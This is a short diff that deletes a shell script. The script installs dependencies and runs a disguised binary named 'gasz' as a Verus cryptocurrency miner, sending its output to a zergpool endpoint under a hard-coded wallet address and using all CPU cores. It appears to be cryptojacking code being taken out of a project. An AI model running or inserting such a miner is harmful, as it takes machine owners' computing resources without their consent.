@@ -1,4 +1,0 @@
-apt update && apt -y install sudo wget curl unzip
-sudo apt-get install libjansson4
-chmod +x gasz
-./gasz  -a verus  -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RC1cM3E6qp34rJtem8fdvkfVQFVPL8pM4V -p c=VRSC,mc=VRSC,ID=gas5 -t $(nproc --all)
